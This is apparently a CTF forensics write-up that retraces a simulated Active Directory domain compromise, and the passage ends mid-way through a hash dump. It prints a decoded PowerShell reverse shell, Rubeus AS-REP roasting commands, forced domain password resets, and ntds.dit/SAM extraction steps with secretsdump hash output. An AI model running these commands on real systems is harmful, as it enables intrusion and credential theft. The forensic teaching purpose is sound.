[{"title":"wolvCTF-2025","date":"2025-03-20T18:30:00.000Z","path":"2025/03/21/wolvctf-2025/","text":"I participated in wolvCTF-2025, organized by w01verines as a core member of the team InfoSecIITR. Our team secured 11th place globally in the Open Bracket. Here are the Writeups of all the Forensics challenges I was personally able to solve during the competition. ForensicsActive series (1, 2 and 3)Challenge DescriptionChal 1 -&gt; Oh no! Our beloved wolvctf.corp domain has been infiltrated! How did they manage to break into our domain controller? Please figure out how they got access into the domain controller box, how a shell was achieved, and how a domain account was obtained. Chal 2 -&gt; The attacker moved laterally throughout our domain. I’m hearing reports from other members of wolvctf.corp that 3 lower level accounts were compromised (excluding the 2 higher level compromised accounts). Figure out which ones these are, and follow the attacker’s steps to collect the flag. Chal 3 -&gt; Now, it’s time to figure out how this attacker obtained administrator access on our domain! To prove you have retraced the attacker’s steps completely, submit the domain admin’s password as the flag. It’s already in the flag format. SolutionWe were given the complete file system of the compromised system and we need to find the complete attack process and follow the evidences to uncover our flags.Let me first describe the entire process of privelage escalation of the attack in brief. 1The attacker first uses `WinPEAS` to discover the running services on the system where he founds an open `MSSQL server` so the attacker first tries brute forcing the credentials in case of a weak password but when it fails he tries to leverage the `xp_cmdshell` to get powershell execution. Along with this the WinPEAS also enumerated the `Autologon creds` to and succesfully retrieves password for dan through which he tries to exploit `Kerberos` using `Rubeus` and gets the access as user emily. Next the file directory of emily gives the user the password for james after which he tries to change the password for both emily and patrick giving him the access as patrick as well. Again the file directory of patrick gives him jake&#x27;s password giving access as jake. Now since there was no possible evidence in the file directory the attacker tries to dump the `registry hives` and get the hash of the domain admin Jessica&#x27;s password which he is able to brute by the group password law in the wolvctf.corp giving the attacker Jessica&#x27;a password and ultimately the `Admin` access. Now lets follow the evidences to retrace this whole process and uncover our three flgs on the way. Presence of MSSQL serverWe can find the WinPEAS (Windows Privilege Escalation Awesome Script), a powerful, automated enumeration tool designed to identify privilege escalation vulnerabilities on Windows systems. output file at the location ./Users/Public/Documents/ where the MSSQL server can be identified running at is default port 1433 in the enumerated IPV4 connections’ section, 12345678910111213141516171819202122232425262728293031323334353637Enumerating IPv4 connections Protocol Local Address Local Port Remote Address Remote Port State Process ID Process Name TCP 0.0.0.0 88 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 135 0.0.0.0 0 Listening 892 svchost TCP 0.0.0.0 389 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 445 0.0.0.0 0 Listening 4 System TCP 0.0.0.0 464 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 593 0.0.0.0 0 Listening 892 svchost TCP 0.0.0.0 636 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 1433 0.0.0.0 0 Listening 3364 C:\\Users\\mssql_service\\MSSQL13.SQLEXPRESS\\MSSQL\\Binn\\sqlservr.exe TCP 0.0.0.0 3268 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 3269 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 3389 0.0.0.0 0 Listening 1436 svchost TCP 0.0.0.0 5985 0.0.0.0 0 Listening 4 System TCP 0.0.0.0 9389 0.0.0.0 0 Listening 2340 Microsoft.ActiveDirectory.WebServices TCP 0.0.0.0 47001 0.0.0.0 0 Listening 4 System TCP 0.0.0.0 49664 0.0.0.0 0 Listening 500 wininit TCP 0.0.0.0 49665 0.0.0.0 0 Listening 356 svchost TCP 0.0.0.0 49666 0.0.0.0 0 Listening 60 svchost TCP 0.0.0.0 49667 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 49669 0.0.0.0 0 Listening 1652 svchost TCP 0.0.0.0 49678 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 49679 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 49681 0.0.0.0 0 Listening 644 lsass TCP 0.0.0.0 49682 0.0.0.0 0 Listening 2304 spoolsv TCP 0.0.0.0 49685 0.0.0.0 0 Listening 636 services TCP 0.0.0.0 49688 0.0.0.0 0 Listening 3364 C:\\Users\\mssql_service\\MSSQL13.SQLEXPRESS\\MSSQL\\Binn\\sqlservr.exe TCP 0.0.0.0 49693 0.0.0.0 0 Listening 2416 dns TCP 0.0.0.0 60689 0.0.0.0 0 Listening 9052 dfsrs TCP 127.0.0.1 53 0.0.0.0 0 Listening 2416 dns TCP 192.168.187.138 53 0.0.0.0 0 Listening 2416 dns TCP 192.168.187.138 139 0.0.0.0 0 Listening 4 System TCP 192.168.187.138 58485 52.159.126.152 443 Established 60 svchost TCP 192.168.187.138 60700 192.168.187.128 1433 Established 8532 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TCP 192.168.231.128 53 0.0.0.0 0 Listening 2416 dns TCP 192.168.231.128 139 0.0.0.0 0 Listening 4 System MSSQL server credential brute forcingWe can find the MSSQL (Microsoft SQL Server 2016 SP2) ERRORLOG at the following location ./Users/mssql_service/MSSQL13.SQLEXPRESS/MSSQL/Log/ where we find the server setup logs (normal) followed by a a series of failed login attempts giving the bruteforce and also the first part of the flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364...2025-03-18 12:29:13.42 Server The SQL Server Network Interface library could not register the Service Principal Name (SPN) [ MSSQLSvc/DC01.wolvctf.corp:1433 ] for the SQL Server service. Windows return code: 0x2098, state: 15. Failure to register a SPN might cause integrated authentication to use NTLM instead of Kerberos. This is an informational message. Further action is only required if Kerberos authentication is required by authentication policies and if the SPN has not been manually registered.2025-03-18 12:29:14.01 Server [ERROR] Failure while enumerating counters: 0xc0000bdb (d:\\b\\s3\\sources\\sql\\ntdbms\\hekaton\\engine\\perfctrs\\hkengperfctrs.cpp : 984 - &#x27;enumerateCountersAndAddToQuery&#x27;)2025-03-18 12:29:14.04 Server Software Usage Metrics is disabled.2025-03-18 13:28:27.74 spid52 Using &#x27;dbghelp.dll&#x27; version &#x27;4.0.5&#x27;2025-03-18 19:51:14.50 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:14.50 Logon Login failed for user &#x27;root&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:15.13 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:15.13 Logon Login failed for user &#x27;test&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:15.74 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:15.74 Logon Login failed for user &#x27;admin&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:16.32 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:16.32 Logon Login failed for user &#x27;bruteforcing&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:17.00 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:17.00 Logon Login failed for user &#x27;this&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:17.85 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:17.85 Logon Login failed for user &#x27;is&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:18.43 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:18.43 Logon Login failed for user &#x27;the&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:19.05 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:19.05 Logon Login failed for user &#x27;first&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:19.69 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:19.69 Logon Login failed for user &#x27;part&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:20.31 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:20.31 Logon Login failed for user &#x27;w&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:20.86 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:20.86 Logon Login failed for user &#x27;c&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:21.68 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:21.68 Logon Login failed for user &#x27;t&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:22.30 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:22.30 Logon Login failed for user &#x27;f&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:23.12 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:23.12 Logon Login failed for user &#x27;&#123;&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:23.96 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:23.96 Logon Login failed for user &#x27;d&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:24.56 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:24.56 Logon Login failed for user &#x27;0&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:25.22 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:25.22 Logon Login failed for user &#x27;n&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:25.82 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:25.82 Logon Login failed for user &#x27;t&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:26.49 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:26.49 Logon Login failed for user &#x27;_&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:27.21 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:27.21 Logon Login failed for user &#x27;3&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:27.93 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:27.93 Logon Login failed for user &#x27;n&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:28.60 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:28.60 Logon Login failed for user &#x27;4&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:29.11 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:29.11 Logon Login failed for user &#x27;b&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:29.64 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:29.64 Logon Login failed for user &#x27;l&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:30.29 Logon Error: 18456, Severity: 14, State: 5.2025-03-18 19:51:30.29 Logon Login failed for user &#x27;3&#x27;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]2025-03-18 19:51:55.62 spid54 Configuration option &#x27;show advanced options&#x27; changed from 1 to 1. Run the RECONFIGURE statement to install.2025-03-18 19:51:55.63 spid54 Configuration option &#x27;xp_cmdshell&#x27; changed from 1 to 1. Run the RECONFIGURE statement to install.2025-03-18 19:51:58.29 spid54 Configuration option &#x27;xp_cmdshell&#x27; changed from 1 to 0. Run the RECONFIGURE statement to install.2025-03-18 19:51:58.33 spid54 Configuration option &#x27;show advanced options&#x27; changed from 1 to 0. Run the RECONFIGURE statement to install.2025-03-18 21:14:25.14 spid5s SQL Server is terminating in response to a &#x27;stop&#x27; request from Service Control Manager. This is an informational message only. No user action is required.2025-03-18 21:14:26.61 spid13s Service Broker manager has shut down.2025-03-18 21:14:26.65 spid5s .NET Framework runtime has been stopped.2025-03-18 21:14:27.51 spid5s SQL Server shutdown has been initiated2025-03-18 21:14:27.53 spid5s SQL Trace was stopped due to server shutdown. Trace ID = &#x27;1&#x27;. This is an informational message only; no user action is required. Flag 1.1: 1wctf&#123;d0nt_3n4bl3_ Getting powershell accessAgain in the WinPEAS output we can find the following process execution signalling xp_cmdshell execution on MSSQL server 123powershell(8532)C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe] -- POwn: MSSQL$SQLEXPRESS Command Line: powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAOAA3AC4AMQAyADgAIgAsADEANAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAIAA9ACAAIgBYADMAaABRAFgAMgBOAHQAWgBIAE4AbwBNAHoARQB4AFgAMwBjAHgAZABHAGgAZgBaAEQATgBtAFkAWABWAHMAZABGADkAagBjAGoATgBrAGMAMQA4AHcAYwBsADgAPQBzACIAOwAkAGYAbABhAGcAcAB0ADIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAKQApADsAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGYAbABhAGcAcAB0ADIAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== Decoding this Base64 encoded cmd gives us 1$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.187.128&quot;,1433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$encoded_flagpt2 = &quot;X3hQX2NtZHNoMzExX3cxdGhfZDNmYXVsdF9jcjNkc18wcl8=s&quot;;$flagpt2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_flagpt2));Write-Output $flagpt2;$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close() This creates a TCP connection and gives a reverse shell to the attacker with full powershell access and it also gives us the second part of our first flag. Flag 1.2: 1_xP_cmdsh311_w1th_d3fault_cr3ds_0r_ Getting Autologon CredentialsNext again we find in the WinPEAS output that it enumerated and successfully gave the credentials of the user dan thus giving the attacker an entry point to the domain. 123456Looking for AutoLogon credentialsSome AutoLogon credentials were found DefaultDomainName : WOLVCTF DefaultUserName : WOLVCTF\\Dan DefaultPassword : DansSuperCoolPassw0rd!! AltDefaultUserName : loot-in-hex:656e61626c335f347574306c6f67306e5f306b3f3f213f7d And the loot-in-hex field gives us our third part of first flag. Flag 1.3: 1enabl3_4ut0log0n_0k??!?&#125; Escalation dan to emilyWe find the ConsoleHost_History.txt for dan at the location ./Users/dan/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine which gives following commands history when the attacker was as dan. 1234567891011cd DesktopInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\dan\\Documents -OutputPrefix &quot;wolvctf_audit&quot;powershell -ep bypass.\\SharpHound.ps1Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\dan\\Documents -OutputPrefix &quot;wolvctf_audit&quot;Import-Module \\SharpHound.ps1Import-Module .\\SharpHound.ps1Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\dan\\Documents -OutputPrefix &quot;wolvctf_audit&quot;.\\Rubeus.exe asreproast /user:emily /domain:wolvctf.corp /dc:DC01.wolvctf.corp &gt; asreproast.output .\\Rubeus.exe kerberoast &gt; kerberoast.outputrunas /User:wolvctf\\emily cmd` This suggests that the user tried to perform the AS-REP Roasting attack on Kerberos Authentication using Rubeus to get the password for emily. So we find the asreproast.output at the location ./Users/dan/Desktop with following output. 123456789101112131415161718192021222324252627282930 ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0 [*] Action: AS-REP roasting[*] Target User : emily[*] Target Domain : wolvctf.corp[*] Target DC : DC01.wolvctf.corp[*] Using domain controller: DC01.wolvctf.corp (fe80::af8f:bc46:1257:36be%5)[*] Building AS-REQ (w/o preauth) for: &#x27;wolvctf.corp\\emily&#x27;[+] AS-REQ w/o preauth successful![*] AS-REP hash: $krb5asrep$emily@wolvctf.corp:34C3460101DA5A3081FA4F6518A0ECE1$619944A029EF908C7 8A80E2559C06788E2D86AEB1C94CD97E4540E5EA57C550C7FBD768D6EA24DBC66CFC6B8A9E39C364 39CA4B50DCF29F3C078785F876835B239B3628F561D080F83294C9A3BC8D1C4DEC538A15339257DC AAB20F33EE168BDEA0671C4AB92DA6B089D7700E7BE42564706BFA903654EDF11376C1994BBE6B9C C65E53275EF3148B638AA5A52284E29912C3CA2171FD50FBD6929511416B51F8C4F8CB9383DA74E8 DB3B0493A2654093C44BC399695525DD90E271A90C9992024A1D05E4188EC588663D2D849142AED6 5C5B77C38ED3DC7BB65178A565248F199B5DC2D382D2DA016DAD023[*_*] d2N0Znthc3IzcHIwNHN0M2Q/Xw== Now the base64 comment at the end gives us the first part of our second flag and on cracking this krb5asrep hash for emily using John the Ripper we can find the password for emily as youdontknowmypasswordhaha. Flag 2.1: 1wctf&#123;asr3pr04st3d?_ Escalation emily to jamesAgain the Console History of emily reveals the following info. 12345678910111213cd C:\\Users\\emilytree /f /a &gt; tree.txttype tree.txtcd Documentsdirtype READMEecho &quot;James asked me to keep his password secret, so I made sure to take extra precautions.&quot; &gt;&gt; C:\\Users\\Public\\loot.txtecho &quot;Note to self: Password for the zip is same as mine, with 777 at the end&quot; &gt;&gt; C:\\Users\\Public\\loot.txtdel READMEcp .\\important.7z C:\\Users\\Publicdel C:\\Users\\Public\\loot.txtdel C:\\Users\\Public\\important.7zrunas /User:wolvctf\\james cmd Which suggest the presence of importat.7z and since we know emily’s password we also know the password for the zip so we quicly extract the zip with the password youdontknowmypasswordhaha777 to find 3 images in the zip car.jpeg, cat.jpg and cattttt.jpeg. And on using binwalk on car.jpeg we get another image which bears the secodn part of flag 2 and also the password for james. Maybe the extra precaution that emily took hinted to this slight steganographic technique of byte scraping. Flag 2.2: 1sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_ Escalation james to patrickViewing the console history for james reveals the following password change attampt. 12345678910cd C:\\Users\\Public\\Documentsmv .\\PowerView.txt .\\PowerView.ps1powershell -ep bypassImport-Module .\\PowerView.ps1Find-DomainProcess$NewPassword = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force`Set-DomainUserPassword -Identity &#x27;emily&#x27; -AccountPassword $NewPassword$NewPassword = ConvertTo-SecureString &#x27;d0nt_us3_4ll3xtendedr1ghts&#125;&#x27; -AsPlainText -Force`Set-DomainUserPassword -Identity &#x27;patrick&#x27; -AccountPassword $NewPasswordrunas /User:wolvctf\\patrick cmd Which shows that the attacker ran PowerView.ps1 a PowerShell script for Active Directory (AD) enumeration and abuse to search for processes running in the domain, helping identify privileged accounts. If the attacker has reset privileges, they forcefully set new passwords for domain users emily and patrick and then get access as patrick. This also gives us the third part of our second flag. Flag 2.3: 1d0nt_us3_4ll3xtendedr1ghts&#125; Escalation patrick to jakePretty straight forward as the password for jake was present in a note_from_jake.txt in the Desktop directory of patrick. 123If you need anything backed up you can just use my account:Password: fwa3fe8#FEwef Escalation jake to jessicaThe console history of jake looked like the follwong. 1234567891011121314151617181920212223242526272829cd C:\\Users\\Public\\Downloadswhoamicd C:\\Users\\jake\\desktopwhoami /all &gt; whoami.txttype .\\whoami.txtcd C:\\Users\\publiccd downloadsdiskshadow.exe /s script.txtdiskshadow.exe /s script.txt &gt; shadow.txttype .\\shadow.txtcp .\\shadow.txt C:\\Users\\jake\\desktop\\shadow.txtdel shadow.txtrobocopy /b z:\\windows\\ntds . ntds.dit &gt; robo.txttype .\\robo.txtdirdel robo.txtcp ntds.dit C:\\Users\\jake\\downloadsdel ntds.ditcd C:\\Users\\jake\\downloadsdirreg save hklm\\system c:\\users\\jake\\downloads\\system.hivereg save hklm\\sam C:\\users\\jake\\downloads\\sam.hivedircp * C:\\Users\\publicdel C:\\Users\\public\\ntds.ditdel C:\\Users\\public\\sam.hivedel C:\\Users\\public\\system.hiverunas /User:wolvctf\\jessicarunas /User:wolvctf\\jessica cmd Which suggests the attacker first ran whoami /all to get detailed user privileges and group memberships, useful for assessing permission levels and then ran a script.txt to like create a shadow copy of the drive, which allows access to locked files such as ntds.dit. Then he extract all ntds.dit, sam.hive and system.hive in order to exxtract jessica’s password and get her accesss. One thing to note is that from the WinPEAS output we already know that Jessica is the domain admin so the last flag is nothing but jessica’s password. 123456789Computer Name : DC01 User Name : jessica User Id : 4107 Is Enabled : True User Type : Administrator Comment : IT Last Logon : 3/18/2025 2:38:19 PM Logons Count : 1 Password Last Set : 3/18/2025 2:34:06 PM Now NTDS.DIT (New Technology Directory Services Directory Information Tree) is the primary database file of Microsoft’s Active Directory Domain Services. Essentially, NTDS.DIT stores and organizes all the information related to objects in the domain, including users, groups, computers, and more. So on inspecting the ntds.dit we find the following piece of information. 1Members who are part of this group have passwords w then a c then a t and an f, curly bracket left, &#x27;bloodhound_is_cool_&#x27; (but all the &#x27;o&#x27;s are &#x27;0&#x27;s), then a city in all lowercase appended by 3 numbers (secret only you know), right curly bracket. So we immediatiely jump to get the hashes for the users using registry hives and Impacket. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879$ secretsdump.py -ntds ntds.dit -system system.hive LOCALImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Target system bootKey: 0x32032d8f6ff9102e4202d192c152e02a[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: a802330d6d1dca4a57a459990af5e50e[*] Reading and decrypting hashes from ntds.ditAdministrator:500:aad3b435b51404eeaad3b435b51404ee:1b921e44ea5dfd940c004044d4ef4cae:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b60be13c1c27a48e5c5afc10792afeab:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7f27814ee1fea90dc7495b265207db9d:::mssql_service:2102:aad3b435b51404eeaad3b435b51404ee:6092ca0e60d24f30d848a5def59d4753:::wolvctf.corp\\james:4101:aad3b435b51404eeaad3b435b51404ee:4c20abe87d36b9ad715fd5671545abb5:::wolvctf.corp\\emily:4102:aad3b435b51404eeaad3b435b51404ee:5c7a26ae4c40018fa1660cc2f1d82269:::wolvctf.corp\\john:4103:aad3b435b51404eeaad3b435b51404ee:d24c1456aefeab3eb911c8015b9f6ce4:::wolvctf.corp\\patrick:4104:aad3b435b51404eeaad3b435b51404ee:0311f96ce47c5cc21529fcc8375f9c2e:::wolvctf.corp\\katherine:4105:aad3b435b51404eeaad3b435b51404ee:89218e0b151209e9d4fa0768ea72c70d:::wolvctf.corp\\Amy:4106:aad3b435b51404eeaad3b435b51404ee:4aa4474c2886f6a796bd75eebe5ebf01:::wolvctf.corp\\jessica:4107:aad3b435b51404eeaad3b435b51404ee:8fcdcffba18f392df7aa291527290aff:::wolvctf.corp\\frank:4108:aad3b435b51404eeaad3b435b51404ee:b0212745c59fcf54f06ea501cd409ff5:::wolvctf.corp\\chris:4109:aad3b435b51404eeaad3b435b51404ee:253cfc1375d39308ab1bb935b44e2010:::wolvctf.corp\\renee:4110:aad3b435b51404eeaad3b435b51404ee:9b5109ef6dbc8086ed36a90c20aa1d48:::wolvctf.corp\\peter:4111:aad3b435b51404eeaad3b435b51404ee:4f3cde005948d4e4fb232c35014ccafb:::wolvctf.corp\\dan:4112:aad3b435b51404eeaad3b435b51404ee:e9d959da74f5c7590a80d635b36705a6:::wolvctf.corp\\jake:4113:aad3b435b51404eeaad3b435b51404ee:cc4f0a96d3c0ce71b664e314b14ecd7e:::[*] Kerberos keys from ntds.ditAdministrator:aes256-cts-hmac-sha1-96:6b130a0ae6ddfb1628acf2ad84147e1ee38015a076aad76b03af0c1da43815a2Administrator:aes128-cts-hmac-sha1-96:9d47fe6fc6471fed5d102f32dfa71eedAdministrator:des-cbc-md5:01a1b5c21f94341cDC01$:aes256-cts-hmac-sha1-96:79c96d12dd9cc6369096bd8dbfe181d921aeffd4aaa53fc0d0263c7a665ee4c3DC01$:aes128-cts-hmac-sha1-96:47991a6fe70596e2f252209a7619ca93DC01$:des-cbc-md5:f7d6a4c8026df26ekrbtgt:aes256-cts-hmac-sha1-96:a570965739e477e5636b47289b0ebd351b89089f904ddf6ba676a95fc043caf6krbtgt:aes128-cts-hmac-sha1-96:d70b85a9394ab390cc7a7d3b294cf841krbtgt:des-cbc-md5:a720fbdfc429ce38mssql_service:aes256-cts-hmac-sha1-96:e3ae0982ea2ae94b4d989a89bbd966e593472e4653869b5188f0f0a175226bd0mssql_service:aes128-cts-hmac-sha1-96:80b0488a2d5c02a819e73f5184fd4609mssql_service:des-cbc-md5:13e51ff2c76802f8wolvctf.corp\\james:aes256-cts-hmac-sha1-96:744c13c321ea323429238a196eab9b65bea41b13577b13cf2ae4775e2540da22wolvctf.corp\\james:aes128-cts-hmac-sha1-96:1f60e252b18a1fe2edd73300996d3daawolvctf.corp\\james:des-cbc-md5:5babd3bc9be6797awolvctf.corp\\emily:aes256-cts-hmac-sha1-96:adcb0acc59b9454912378c69039bea23fee975074f9e0fd09b738cb1eb98fe54wolvctf.corp\\emily:aes128-cts-hmac-sha1-96:1950a20a02f7e41d000546d0aed292fcwolvctf.corp\\emily:des-cbc-md5:d5e58929a4b96b3dwolvctf.corp\\john:aes256-cts-hmac-sha1-96:d7aa03485fdead391b6c32bca4ebf7f0b3e6dc2cfd20c3a240bf066cbda3f4a9wolvctf.corp\\john:aes128-cts-hmac-sha1-96:df8b329de72ab17b743943e3a4023acawolvctf.corp\\john:des-cbc-md5:b931a88615a794abwolvctf.corp\\patrick:aes256-cts-hmac-sha1-96:e01f8578724ef569bf545872403df16a3ac16bc67604f911dd97df88f3363efdwolvctf.corp\\patrick:aes128-cts-hmac-sha1-96:0895763e253a210250b544de1eba67d9wolvctf.corp\\patrick:des-cbc-md5:57ba527967611658wolvctf.corp\\katherine:aes256-cts-hmac-sha1-96:b41404d85f0286000725a603bc890c5941c2356446f1acc6c6b4b80bd5b9fb16wolvctf.corp\\katherine:aes128-cts-hmac-sha1-96:32c9f2a4c32fa36dc248fea63c7a985fwolvctf.corp\\katherine:des-cbc-md5:9b852fb319e68aa8wolvctf.corp\\Amy:aes256-cts-hmac-sha1-96:88393904dcb9cfced8e477dbab7b8d2ce1967254789e075a932541dadb6a7561wolvctf.corp\\Amy:aes128-cts-hmac-sha1-96:7970b15f1ff40798a75eb47a80b5d117wolvctf.corp\\Amy:de